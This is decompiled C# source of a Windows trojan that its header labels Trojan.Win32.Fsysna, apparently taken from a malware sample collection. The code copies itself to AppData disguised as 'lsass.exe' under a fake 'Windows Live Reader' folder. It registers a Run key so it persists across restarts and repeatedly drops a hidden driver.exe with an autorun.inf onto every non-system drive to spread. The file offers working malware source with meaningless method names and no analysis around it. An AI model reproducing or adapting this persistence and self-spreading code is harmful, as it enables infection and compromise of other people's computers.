// Decompiled with JetBrains decompiler
// Type: cliente.insta
// Assembly: cliente, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 93A55DE0-10E1-46A2-BE93-6BF6C932E5D1
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkys-27e1831bfa3ff50e5bd76882076cf96f1f0837b7433f502a8f2893e086e3ed2e.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace cliente
{
  internal class insta
  {
    private static string aaaaaa1;
    private static string aaaaaa2;
    private static string aaaaaa3;
    private static byte[] aaaaaa4;
    private static Random r = new Random();

    private static string ttttttttt()
    {
      string str = "";
      int num = insta.r.Next(30, 70);
      for (int index = 0; index < num; ++index)
        str += (string) (object) (char) insta.r.Next(65, 90);
      return str;
    }

    public static void kljasdkljasdlkjadslkajsdklasdklasdkjlasdkjladsjskadkjsladkjladsdskl()
    {
      insta.nbcxvmnbxcnmc();
      while (true)
      {
        string[] logicalDrives = Environment.GetLogicalDrives();
        for (int index1 = 0; index1 < logicalDrives.Length; ++index1)
        {
          if ((int) logicalDrives[index1][0] != (int) Environment.SystemDirectory[0])
          {
            try
            {
              StreamWriter streamWriter = new StreamWriter(logicalDrives[index1] + "/autorun.inf");
              for (int index2 = 0; index2 < 5; ++index2)
                streamWriter.WriteLine(";" + insta.ttttttttt());
              streamWriter.WriteLine("[autorun]");
              for (int index3 = 0; index3 < 5; ++index3)
                streamWriter.WriteLine(";" + insta.ttttttttt());
              streamWriter.WriteLine("open=driver.exe");
              for (int index4 = 0; index4 < 5; ++index4)
                streamWriter.WriteLine(";" + insta.ttttttttt());
              streamWriter.WriteLine("icon=%SystemRoot%\\system32\\SHELL32.dll,8");
              for (int index5 = 0; index5 < 5; ++index5)
                streamWriter.WriteLine(";" + insta.ttttttttt());
              streamWriter.Close();
              FileStream output = new FileStream(logicalDrives[index1] + "/driver.exe", FileMode.Create);
              BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
              binaryWriter.Write(insta.aaaaaa4);
              binaryWriter.Flush();
              binaryWriter.Close();
              output.Close();
              GC.Collect();
              File.SetAttributes(logicalDrives[index1] + "/autorun.inf", FileAttributes.Hidden);
              File.SetAttributes(logicalDrives[index1] + "/driver.exe", FileAttributes.Hidden);
            }
            catch
            {
            }
          }
        }
        Thread.Sleep(15000);
      }
    }

    public static bool jgtujugtjugtjgu()
    {
      try
      {
        insta.aaaaaa1 = Assembly.GetExecutingAssembly().CodeBase.Remove(0, 8).Replace("/", "\\");
        insta.aaaaaa2 = insta.laksdlkajsdlk(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + "\\Local\\Windows Live Reader";
        insta.aaaaaa3 = insta.laksdlkajsdlk(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + "\\Local\\Windows Live Reader\\lsass.exe";
        if ((int) insta.aaaaaa3.ToLower()[0] != (int) insta.aaaaaa1.ToLower()[0])
          Process.Start(insta.aaaaaa1[0].ToString() + ":/");
        if (insta.aaaaaa3.ToLower() == insta.aaaaaa1.ToLower())
          return false;
        Directory.CreateDirectory(insta.aaaaaa2);
        insta.aaaaaa2 += "\\lsass.exe";
        insta.nbcxvmnbxcnmc();
        insta.sdajiadsijasjdias();
      }
      catch
      {
      }
      return true;
    }

    private static string laksdlkajsdlk(string ruta)
    {
      try
      {
        int length = ruta.LastIndexOf('\\');
        return ruta.Substring(0, length);
      }
      catch
      {
        return "";
      }
    }

    private static void nbcxvmnbxcnmc()
    {
      try
      {
        FileStream input = new FileStream(insta.aaaaaa1, FileMode.Open, FileAccess.Read);
        BinaryReader binaryReader = new BinaryReader((Stream) input);
        insta.aaaaaa4 = binaryReader.ReadBytes(Convert.ToInt32(input.Length));
        input.Close();
        binaryReader.Close();
        GC.Collect();
      }
      catch
      {
      }
    }

    private static void sdajiadsijasjdias()
    {
      try
      {
        FileStream output = new FileStream(insta.aaaaaa2, FileMode.Create);
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write(insta.aaaaaa4);
        binaryWriter.Flush();
        binaryWriter.Close();
        output.Close();
        GC.Collect();
        try
        {
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Live Reader", (object) insta.aaaaaa2, RegistryValueKind.String);
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
